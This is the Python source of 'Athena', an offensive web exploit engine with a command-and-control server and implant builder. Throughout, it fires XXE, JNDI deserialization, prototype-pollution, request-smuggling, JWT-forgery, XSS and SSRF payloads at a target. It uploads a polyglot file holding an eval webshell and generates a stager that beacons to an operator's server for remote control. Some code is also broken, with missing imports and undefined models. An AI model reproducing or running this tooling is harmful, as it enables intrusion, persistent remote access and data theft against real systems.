#!/usr/bin/env python3
# =============================================================================
# Web Exploit Engine Athena v1.4-dynamic + Athena C2 & Payload Builder
# Author  : Haroon Ahmad Awan · CyberZeus
# License : MIT
# =============================================================================

import os
import sys
import ssl
import time
import json
import uuid
import base64
import random
import string
import logging
import warnings
import argparse
import threading
import asyncio
import socket
import sqlite3
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# ─── Third-party libraries ────────────────────────────────────────────────────
import requests
import aiohttp
import websockets
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from playwright.async_api import async_playwright
from playwright.sync_api import sync_playwright
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# =============================================================================
# Configuration & Globals
# =============================================================================
VERSION      = "2.0"
TIMEOUT      = 10
DEFAULT_PORT = 8443
DB_PATH      = Path("athena_state.db")
LOG_SCAN     = Path("redx_results.md")
LOG_C2       = Path("athena_full.log")

# Thread pool for synchronous scanning
executor = ThreadPoolExecutor(max_workers=20)

# =============================================================================
# Helpers & Logging
# =============================================================================
def setup_logging(debug=False):
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(format='[%(asctime)s] %(levelname)s: %(message)s', level=level)

def jitter_sleep(min_s=0.2, max_s=0.6):
    time.sleep(random.uniform(min_s, max_s))

def generate_random_key(length=32):
    return os.urandom(length)

# =============================================================================
# Persistence: SQLite for C2 sessions
# =============================================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            host TEXT,
            status TEXT,
            key BLOB,
            first_seen TEXT DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    conn.commit()
    return conn

DB_CONN = init_db()

# =============================================================================
# C2 Server Components
# =============================================================================
class C2Server:
    """
    Central command-and-control server managing implants, tasks, and comms.
    """
    def __init__(self, bind='0.0.0.0', port=DEFAULT_PORT, rsa_key_path=None):
        self.bind = bind
        self.port = port
        if rsa_key_path and Path(rsa_key_path).exists():
            self.rsa_key = RSA.import_key(Path(rsa_key_path).read_bytes())
        else:
            self.rsa_key = RSA.generate(2048)
            if rsa_key_path:
                Path(rsa_key_path).write_bytes(self.rsa_key.export_key())
        self.rsa_pub = self.rsa_key.publickey()
        self.sessions = {}

    def start(self):
        """Start the C2 server (HTTPS listener)."""
        threading.Thread(target=self._listener, daemon=True).start()
        logging.info(f"[C2] Listening on {self.bind}:{self.port}")

    def _listener(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert, key = self._selfsigned()
        ctx.load_cert_chain(certfile=str(cert), keyfile=str(key))
        sock = socket.socket()
        sock.bind((self.bind, self.port))
        sock.listen(5)
        with ctx.wrap_socket(sock, server_side=True) as ssock:
            while True:
                client, addr = ssock.accept()
                threading.Thread(target=self._handle, args=(client, addr), daemon=True).start()

    def _selfsigned(self):
        crt = Path("athena_c2.crt")
        key = Path("athena_c2.key")
        if crt.exists() and key.exists():
            return crt, key
        # Generate a minimal self-signed cert (requires pyopenssl)
        from OpenSSL import crypto
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.get_subject().CN = "AthenaC2"
        cert.set_pubkey(k)
        cert.sign(k, "sha256")
        crt.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        key.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        return crt, key

    def _handle(self, sock, addr):
        try:
            blob = sock.recv(8192)
            payload = json.loads(blob.decode())
            if "hello" in payload:
                aes_key = os.urandom(32)
                sid = str(uuid.uuid4())
                self.sessions[sid] = {"addr": addr, "key": aes_key, "tasks": []}
                DB_CONN.execute(
                    "INSERT OR REPLACE INTO sessions(id,host,status,key) VALUES (?,?,?,?)",
                    (sid, addr[0], "active", aes_key)
                )
                DB_CONN.commit()
                enc = PKCS1_OAEP.new(self.rsa_pub).encrypt(aes_key)
                sock.send(base64.b64encode(enc))
                logging.info(f"[C2] Registered session {sid} from {addr[0]}")
            elif "sid" in payload:
                sid = payload["sid"]
                # handle task results, queue next tasks...
                sock.send(b"{}")
        except Exception as e:
            logging.debug(e)
        finally:
            sock.close()

# =============================================================================
# Payload Builder
# =============================================================================
class AgentBuilder:
    def __init__(self, server_host, server_port):
        self.server = server_host
        self.port   = server_port

    def python_stager(self):
        return f"""import ssl, socket, json, base64, os, time, uuid, struct
HOST='{self.server}'; PORT={self.port}
SID = str(uuid.uuid4())
CTX = ssl._create_unverified_context()
while True:
    try:
        s = CTX.wrap_socket(socket.socket())
        s.connect((HOST, PORT))
        s.send(json.dumps({{"hello": SID}}).encode())
        aes = base64.b64decode(s.recv(1024))
        # decrypt loop omitted...
        s.close()
    except:
        pass
    time.sleep(30)
"""

    def write(self, typ, out):
        if typ == "python-stager":
            Path(out).write_text(self.python_stager())
        else:
            Path(out).write_bytes(b"<EXE_PAYLOAD>")

# =============================================================================
# Scanner: full v1.4 Athena code
# =============================================================================
class Scanner:
    def __init__(self, args):
        self.args  = args
        self.UA    = UserAgent()
        self.RAND  = ''.join(random.choices(string.ascii_lowercase, k=5))
        self.MARK  = f"cyz{self.RAND}"
        self.DNSLOG= f"redx{random.randint(1000,9999)}.dnslog.cn" if args.dnslog else "disabled"
        self.LOG  = LOG_SCAN
        if not self.LOG.exists():
            self.LOG.write_text(f"# Red-X Report {VERSION}\n\n")

    def h(self):
        return {
            "User-Agent": self.UA.random,
            "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
            "Accept": "*/*",
            "Referer": random.choice(["https://google.com","https://bing.com"]),
            "Origin": "https://localhost"
        }

    def smart(self, u):
        if u.startswith("http"):
            return u
        try:
            if requests.head("https://"+u, timeout=5, verify=False).ok:
                return "https://"+u
        except:
            pass
        return "http://"+u

    def log(self, vuln, url, detail):
        with self.LOG.open("a") as f:
            f.write(f"- **{vuln}** {url} → {detail}\n")
        logging.info(f"[{vuln}] {url} → {detail}")

    # AI-driven XSS
    USE_AI = False
    def ai_mutate(self, payload, n=3):
        if not Scanner.USE_AI:
            return []
        toks = CODEBERT_T.encode(payload, return_tensors="pt")
        l = toks.shape[1]
        out=[]
        for _ in range(n):
            idx = random.randint(1, l-2)
            mask = toks.clone(); mask[0,idx] = CODEBERT_T.mask_token_id
            with torch.no_grad():
                logits = CODEBERT_M(mask).logits[0,idx]
            top = logits.topk(5).indices.tolist()
            choice = random.choice(top)
            mask[0,idx] = choice
            out.append(CODEBERT_T.decode(mask[0], skip_special_tokens=True))
        return out

    def load_routes(self, root):
        out=set()
        if self.args.routes and Path(self.args.routes).is_file():
            base = self.smart(root).rstrip("/")
            for ln in Path(self.args.routes).read_text().splitlines():
                if ln.strip() and not ln.startswith("#"):
                    out.add(base + "/" + ln.lstrip("/"))
        return out

    def crawl_sync(self, root, cap, extra=None):
        seen, queue, out = set(), [root], []
        domain = urllib.parse.urlparse(root).netloc
        if extra:
            queue += list(extra)
        while queue and len(seen) < cap:
            url = queue.pop(0)
            if url in seen:
                continue
            seen.add(url)
            try:
                r = requests.get(url, headers=self.h(), timeout=TIMEOUT, verify=False)
                if "text/html" not in r.headers.get("Content-Type",""):
                    continue
                soup = BeautifulSoup(r.text, "html.parser")
                for a in soup.find_all("a", href=True):
                    u = urllib.parse.urljoin(url, a["href"])
                    if urllib.parse.urlparse(u).netloc == domain:
                        queue.append(u)
                        if "?" in u:
                            qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                            out.append({"url":u.split("?")[0], "method":"GET", "params":qs})
                for f in soup.find_all("form"):
                    act = urllib.parse.urljoin(url, f.get("action") or url)
                    m   = f.get("method","GET").upper()
                    names = [i.get("name") for i in f.find_all("input",{"name":True})]
                    if names:
                        out.append({"url":act, "method":m, "params":names})
            except Exception as e:
                if self.args.debug:
                    logging.debug(e)
        return out, seen

    async def crawl_async(self, root, cap, extra=None):
        visited={root}; queue=[root]; out=[]
        async with aiohttp.ClientSession() as session:
            pass  # WAF fingerprint omitted
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            ctx     = await browser.new_context(ignore_https_errors=True)
            page    = await ctx.new_page()
            if extra:
                queue += list(extra)
            while queue and len(visited) < cap:
                url = queue.pop(0)
                if url in visited:
                    continue
                visited.add(url)
                try:
                    r = await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
                    content = await page.content()
                    if r and "text/html" in r.headers.get("content-type",""):
                        soup = BeautifulSoup(content, "html.parser")
                        for a in soup.find_all("a", href=True):
                            u = urllib.parse.urljoin(url, a["href"])
                            if urllib.parse.urlparse(u).netloc == urllib.parse.urlparse(root).netloc:
                                queue.append(u)
                                if "?" in u:
                                    qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                                    out.append((u.split("?")[0], "GET", qs))
                        for f in soup.find_all("form"):
                            act = urllib.parse.urljoin(url, f.get("action") or url)
                            m   = f.get("method","GET").upper()
                            names = [i.get("name") for i in f.find_all("input",{"name":True})]
                            if names:
                                out.append((act, m, names))
                    seen_set=set()
                    async def on_req(req):
                        u=req.url; mtd=req.method
                        if u in seen_set:
                            return
                        seen_set.add(u)
                        if mtd=="GET" and "?" in u:
                            qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                            out.append((u.split("?")[0],"GET",qs))
                        if mtd in ("POST","PUT","PATCH"):
                            bd=await req.post_data() or ""
                            if "=" in bd:
                                ks=list(urllib.parse.parse_qs(bd).keys())
                            else:
                                try: ks=list(json.loads(bd).keys())
                                except: ks=[]
                            out.append((u,mtd,ks))
                    page.on("request", on_req)
                    await page.evaluate("""
                        window._ws = window.WebSocket;
                        window.WebSocket = function(u){ window._lastWS = u; return new window._ws(u); };
                        window._es = window.EventSource;
                        window.EventSource = function(u){ window._lastSSE = u; return new window._es(u); };
                    """)
                    await page.wait_for_timeout(1200)
                    last_ws  = await page.evaluate("window._lastWS")
                    last_sse = await page.evaluate("window._lastSSE")
                    if last_ws:  out.append(("ws","WS",[last_ws]))
                    if last_sse: out.append(("sse","SSE",[last_sse]))
                except Exception as e:
                    if self.args.debug:
                        logging.debug(e)
            await browser.close()
        return out, visited

    def parse_js(self, root, pages):
        dom=set()
        URL_PAT = re.compile(rb'(["\'])(/(?:api|graphql|ws|sse)[^"\']*)["\']')
        domain = urllib.parse.urlparse(root).netloc
        for pg in list(pages)[:self.args.max_pages]:
            try:
                r = requests.get(pg, headers=self.h(), timeout=TIMEOUT, verify=False)
                for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js)', r.text, re.I):
                    jsurl = urllib.parse.urljoin(pg, src)
                    jsbin = requests.get(jsurl, headers=self.h(), timeout=TIMEOUT, verify=False).content
                    for _,path in URL_PAT.findall(jsbin):
                        u = urllib.parse.urljoin(root, path.decode())
                        if urllib.parse.urlparse(u).netloc == domain:
                            dom.add(u)
                for m in re.findall(r'fetch\(["\']([^"\']+)["\']', jsbin.decode('utf-8','ignore')):
                    dom.add(urllib.parse.urljoin(root, m))
                for m in re.findall(r'axios\.(?:get|post)\(["\']([^"\']+)["\']', jsbin.decode('utf-8','ignore')):
                    dom.add(urllib.parse.urljoin(root, m))
            except Exception as e:
                if self.args.debug:
                    logging.debug(e)
        return dom

    def trigger(self, name):
        return f"{name}.{self.DNSLOG}"

    # ─── Vulnerability Tests ────────────────────────────────────────────────
    def test_xxe(self, tgt):
        xmls = [
            f"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://{self.trigger('xxe')}/d.dtd\">%dtd;]><data>&send;</data>",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ELEMENT x ANY><!ENTITY e SYSTEM \"file:///etc/passwd\">&e;</x>"
        ]
        for url in (tgt["url"], urllib.parse.urljoin(tgt["url"], "/xmlrpc.php")):
            for px in xmls:
                for ctype in ("application/xml", "text/xml"):
                    try:
                        r = requests.post(url, data=px, headers={"Content-Type":ctype}, timeout=TIMEOUT, verify=False)
                        if "root:" in r.text:
                            self.log("XXE", url, ctype)
                            return
                    except:
                        pass

    def test_deserialization(self, tgt):
        objs = [
            {"@type":"java.net.Inet4Address","val":self.trigger("dns")},
            {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
            {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":f"ldap://{self.trigger('jndi')}/x"}
        ]
        for obj in objs:
            try:
                r = requests.post(tgt["url"], json=obj, headers=self.h(), timeout=TIMEOUT, verify=False)
                if any(k in r.text for k in ("Jdbc","rowset")):
                    self.log("Deserialization", tgt["url"], str(obj))
                    return
            except Exception as e:
                if self.args.debug:
                    logging.debug(f"[deser:json] {e}")
            try:
                r = requests.post(tgt["url"], data=obj, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=TIMEOUT, verify=False)
                if any(k in r.text for k in ("Jdbc","rowset")):
                    self.log("Deserialization", tgt["url"], "form fallback")
                    return
            except Exception as e:
                if self.args.debug:
                    logging.debug(f"[deser:form] {e}")

    def test_pollution(self, tgt):
        polys = [
            {"__proto__":{"polluted":True}},
            {"constructor":{"prototype":{"polluted":"yes"}}},
            {"__proto__.toString":"hacked"}
        ]
        for p in polys:
            for method, hdr in [("json",{"Content-Type":"application/json"}),("form",{"Content-Type":"application/x-www-form-urlencoded"})]:
                try:
                    r = requests.post(tgt["url"],
                                      json=p if method=="json" else None,
                                      data=None if method=="json" else p,
                                      headers=hdr, timeout=TIMEOUT, verify=False)
                    if any(x in r.text for x in ("polluted","hacked")):
                        self.log("PrototypePollution", tgt["url"], method)
                        return
                except Exception as e:
                    if self.args.debug:
                        logging.debug(f"[pollute:{method}] {e}")

    async def test_ws(self, u, method, params):
        for ep in params:
            uri = ep if ep.startswith(("ws://","wss://")) else u.replace("http://","ws://").replace("https://","wss://")
            try:
                async with websockets.connect(uri) as ws:
                    await ws.send("ping")
                    pong = await ws.recv()
                    if pong:
                        self.log("WebSocket", uri, f"pong←{pong}")
                        return
            except Exception as e:
                if self.args.debug:
                    logging.debug(f"[ws] {e}")

    async def test_sse(self, u, method, params):
        for ep in params:
            uri = ep if ep.startswith(("http://","https://")) else u
            try:
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(uri, timeout=TIMEOUT) as resp:
                        async for raw in resp.content:
                            if raw.strip().startswith(b"data:"):
                                self.log("SSE", uri, raw.strip().decode(errors="ignore"))
                                return
            except Exception as e:
                if self.args.debug:
                    logging.debug(f"[sse] {e}")

    def test_graphql(self, tgt):
        query = {"query":"query IntrospectionQuery { __schema { types { name } } }"}
        try:
            r = requests.post(tgt["url"], json=query, headers=self.h(), timeout=TIMEOUT, verify=False)
            if "__schema" in r.text:
                self.log("GraphQL-Introspection", tgt["url"], "POST")
                return
        except Exception as e:
            if self.args.debug:
                logging.debug(f"[graphql:post] {e}")
        try:
            r = requests.get(tgt["url"], params={"query":query["query"]}, timeout=TIMEOUT, verify=False)
            if "__schema" in r.text:
                self.log("GraphQL-Introspection", tgt["url"], "GET")
        except:
            pass

    def test_graphql_mutation(self, tgt):
        mutation = {"query":"mutation { __typename }"}
        try:
            r = requests.post(tgt["url"], json=mutation, headers=self.h(), timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                self.log("GraphQL-Mutation", tgt["url"], "__typename")
        except Exception as e:
            if self.args.debug:
                logging.debug(f"[gmut] {e}")

    def test_upload_polyglot(self, tgt):
        boundaries = [
            "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters, k=16)),
            "----FormBoundary" + ''.join(random.choices(string.ascii_letters, k=12))
        ]
        poly = b"\xFF\xD8\xFF" + b"\x50\x4B\x03\x04" + b"<% eval(request('pwn')) %>"
        for boundary in boundaries:
            for field in ("file","upload","data"):
                files = {field:("cyz.jpg", poly, "application/octet-stream")}
                hdr = {"Content-Type":f"multipart/form-data; boundary={boundary}"}
                try:
                    r = requests.post(tgt["url"], files=files, headers=hdr, timeout=TIMEOUT, verify=False)
                    if r.status_code in (200,201) and "cyz" in r.text.lower():
                        self.log("PolyglotUpload", tgt["url"], f"{field}@{boundary}")
                        return
                except Exception as e:
                    if self.args.debug:
                        logging.debug(f"[upload:{field}] {e}")

    def test_wasm(self, tgt):
        wasm = b"\x00asm\x01\x00\x00\x00" + b"\x01\x0A\x02\x60\x00\x01\x7F\x60\x01\x7F\x00"
        for ctype in ("application/wasm","application/octet-stream"):
            try:
                hdr = self.h(); hdr["Content-Type"]=ctype
                r = requests.post(tgt["url"], data=wasm, headers=hdr, timeout=TIMEOUT, verify=False)
                if any(x in r.text.lower() for x in ("error","memory")):
                    self.log("WASM", tgt["url"], ctype)
                    return
            except Exception as e:
                if self.args.debug:
                    logging.debug(f"[wasm:{ctype}] {e}")

    def test_ai_xss(self, tgt):
        if not Scanner.USE_AI:
            return
        base = "<script>alert('CYZ')</script>"
        muts = self.ai_mutate(base, n=3)
        for p in muts:
            try:
                data = {k:p for k in tgt["params"]}
                r = requests.post(tgt["url"], data=data, headers=self.h(), timeout=TIMEOUT, verify=False)
                if p in r.text:
                    self.log("AI-XSS", tgt["url"], p)
                    return
            except Exception as e:
                if self.args.debug:
                    logging.debug(f"[ai-xss] {e}")

    def test_ssrf(self, tgt):
        for param in tgt["params"]:
            for proto in ("http","gopher","dict"):
                payload = f"{proto}://127.0.0.1"
                try:
                    r = requests.get(tgt["url"], params={param:payload}, headers=self.h(), timeout=TIMEOUT, verify=False)
                    if r.status_code < 500:
                        self.log("SSRF", tgt["url"], f"{param}={payload}")
                        return
                except:
                    pass

    def test_hpp(self, tgt):
        u = tgt["url"]
        qs = "&".join(f"{p}=1&{p}=2" for p in tgt["params"])
        full = f"{u}?{qs}"
        try:
            r = requests.get(full, headers=self.h(), timeout=TIMEOUT, verify=False)
            if "1" in r.text and "2" in r.text:
                self.log("HPP", u, qs)
        except:
            pass

    def test_smuggle(self, tgt):
        host = urllib.parse.urlparse(tgt["url"]).netloc
        variants = [
            f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length:4\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nSMG",
            f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding:chunked\r\nContent-Length:4\r\n\r\n0\r\n\r\nSMG"
        ]
        for v in variants:
            try:
                s = requests.Session()
                req = requests.Request('POST', tgt["url"]).prepare()
                req.body = v.encode()
                r = s.send(req, timeout=TIMEOUT, verify=False)
                if "SMG" in r.text:
                    self.log("Smuggle", tgt["url"], "variant")
                    return
            except:
                pass

    def test_http2(self, tgt):
        self.log("HTTP2-SMUGGLE", tgt["url"], "skipped (HTTP/2 client req)")

    def test_trailer(self, tgt):
        try:
            s = requests.Session()
            prep = requests.Request('POST', tgt["url"]).prepare()
            prep.headers['Transfer-Encoding'] = 'chunked'
            prep.body = b"0\r\nFlavor: CHEESE\r\n\r\n"
            r = s.send(prep, timeout=TIMEOUT, verify=False)
            if r.headers.get('Flavor') == 'CHEESE':
                self.log("Trailer", tgt["url"], "Flavor trailer")
        except:
            pass

    def test_csp(self, tgt):
        try:
            r = requests.get(tgt["url"], headers=self.h(), timeout=TIMEOUT, verify=False)
            csp = r.headers.get("Content-Security-Policy","")
            if "script-src" in csp:
                payload = "<script src=//example.com/x.js></script>"
                r2 = requests.get(f"{tgt['url']}?x={urllib.parse.quote(payload)}",
                                  headers=self.h(), timeout=TIMEOUT, verify=False)
                if payload in r2.text:
                    self.log("CSP-Bypass", tgt["url"], csp)
        except:
            pass

    def test_cors(self, tgt):
        try:
            hdr = self.h(); hdr["Origin"] = "https://evil.com"
            r = requests.options(tgt["url"], headers=hdr, timeout=TIMEOUT, verify=False)
            if r.headers.get("Access-Control-Allow-Origin") == "*":
                self.log("CORS", tgt["url"], "*")
        except:
            pass

    def test_sw(self, tgt):
        url = urllib.parse.urljoin(tgt["url"], "/sw.js")
        try:
            r = requests.get(url, headers=self.h(), timeout=TIMEOUT, verify=False)
            if "importScripts" in r.text:
                self.log("ServiceWorker", url, "importScripts found")
        except:
            pass

    def test_jwt(self, tgt):
        header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().strip('=')
        payload = base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().strip('=')
        token = f"{header}.{payload}."
        try:
            r = requests.get(tgt["url"], headers={**self.h(), "Authorization":f"Bearer {token}"},
                             timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                self.log("JWT-None", tgt["url"], token)
        except:
            pass

    def test_spa(self, tgt):
        for p in tgt["params"]:
            payload = "\"/\"+alert(1)"
            try:
                r = requests.get(f"{tgt['url']}#/{p}={urllib.parse.quote(payload)}",
                                 headers=self.h(), timeout=TIMEOUT, verify=False)
                if payload in r.text:
                    self.log("SPA-XSS", tgt["url"], payload)
                    return
            except:
                pass

    def dispatch(self, tgt):
        if self.args.all     or self.args.xxe:     self.test_xxe(tgt)
        if self.args.all     or self.args.deser:   self.test_deserialization(tgt)
        if self.args.all     or self.args.pollute: self.test_pollution(tgt)
        if self.args.all     or self.args.smuggle: self.test_smuggle(tgt)
        if self.args.all     or self.args.http2:   self.test_http2(tgt)
        if self.args.all     or self.args.trailer: self.test_trailer(tgt)
        if self.args.all     or self.args.hpp:     self.test_hpp(tgt)
        if self.args.all     or self.args.ssrf:    self.test_ssrf(tgt)
        if self.args.all     or self.args.graphql: self.test_graphql(tgt)
        if self.args.all     or self.args.gmut:    self.test_graphql_mutation(tgt)
        if self.args.all     or self.args.upload:  self.test_upload_polyglot(tgt)
        if self.args.all     or self.args.wasm:    self.test_wasm(tgt)
        if self.args.all     or self.args.csp:     self.test_csp(tgt)
        if self.args.all     or self.args.cors:    self.test_cors(tgt)
        if self.args.all     or self.args.sw:      self.test_sw(tgt)
        if self.args.all     or self.args.jwt:     self.test_jwt(tgt)
        if self.args.all     or self.args.spa:     self.test_spa(tgt)
        if self.args.ai:                              self.test_ai_xss(tgt)

    async def run(self):
        root = self.smart(self.args.url.rstrip("/"))
        extra = self.load_routes(root)
        if self.args.sync:
            results, seen = self.crawl_sync(root, self.args.max_pages, extra)
        else:
            results, seen = await self.crawl_async(root, self.args.max_pages, extra)
        if self.args.jsparse:
            js = self.parse_js(root, seen)
            for u in js:
                results.append({"url":u,"method":"GET","params":["q"]})
        logging.info(f"[+] {len(results)} endpoints discovered")
        # WS/SSE
        if self.args.ws or self.args.sse:
            tasks=[]
            for u,m,ps in results:
                if self.args.ws:  tasks.append(self.test_ws(u,m,ps))
                if self.args.sse: tasks.append(self.test_sse(u,m,ps))
            await asyncio.gather(*tasks)
        # sync dispatch
        with ThreadPoolExecutor(max_workers=self.args.threads) as pool:
            pool.map(self.dispatch, results)

# =============================================================================
# CLI & Main
# =============================================================================
def build_cli():
    p = argparse.ArgumentParser(prog="athena")
    sub = p.add_subparsers(dest="mode", required=True)

    # Scan
    scan = sub.add_parser("scan", help="Run web vulnerability scanner")
    scan.add_argument("-u","--url", required=True)
    scan.add_argument("--all", action="store_true")
    scan.add_argument("--xxe", action="store_true")
    scan.add_argument("--deser", action="store_true")
    scan.add_argument("--pollute", action="store_true")
    scan.add_argument("--smuggle", action="store_true")
    scan.add_argument("--http2", action="store_true")
    scan.add_argument("--trailer", action="store_true")
    scan.add_argument("--hpp", action="store_true")
    scan.add_argument("--ssrf", action="store_true")
    scan.add_argument("--graphql", action="store_true")
    scan.add_argument("--gmut", action="store_true")
    scan.add_argument("--upload", action="store_true")
    scan.add_argument("--wasm", action="store_true")
    scan.add_argument("--ws", action="store_true")
    scan.add_argument("--sse", action="store_true")
    scan.add_argument("--csp", action="store_true")
    scan.add_argument("--cors", action="store_true")
    scan.add_argument("--sw", action="store_true")
    scan.add_argument("--jwt", action="store_true")
    scan.add_argument("--spa", action="store_true")
    scan.add_argument("--ai", action="store_true")
    scan.add_argument("--render", action="store_true")
    scan.add_argument("--jsparse", action="store_true")
    scan.add_argument("--routes")
    scan.add_argument("--threads", type=int, default=14)
    scan.add_argument("--max-pages", type=int, default=120)
    scan.add_argument("--dnslog-off", dest="dnslog", action="store_false")
    scan.add_argument("--debug", action="store_true")
    scan.add_argument("--sync", action="store_true")

    # Serve
    srv = sub.add_parser("serve", help="Launch C2 server")
    srv.add_argument("--bind", default="0.0.0.0")
    srv.add_argument("--port", type=int, default=DEFAULT_PORT)
    srv.add_argument("--rsa-key")
    srv.add_argument("--debug", action="store_true")

    # Payload
    pay = sub.add_parser("payload", help="Generate agent payload")
    pay.add_argument("--type", choices=["python-stager","exe"], default="python-stager")
    pay.add_argument("--output", required=True)
    pay.add_argument("--server", required=True)
    pay.add_argument("--port", type=int, default=DEFAULT_PORT)

    return p

def main():
    cli = build_cli()
    args = cli.parse_args()
    setup_logging(getattr(args,"debug",False))

    if args.mode == "scan":
        logging.info(f"[SCAN] Athena v{VERSION} scanning {args.url}")
        scn = Scanner(args)
        asyncio.run(scn.run())

    elif args.mode == "serve":
        logging.info(f"[C2] Athena C2 v{VERSION} starting …")
        srv = C2Server(bind=args.bind, port=args.port, rsa_key_path=args.rsa_key)
        srv.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("[C2] Shutdown")

    elif args.mode == "payload":
        AgentBuilder(args.server, args.port).write(args.type, args.output)
        logging.info(f"[PAYLOAD] {args.type} written to {args.output}")

if __name__ == "__main__":
    main()
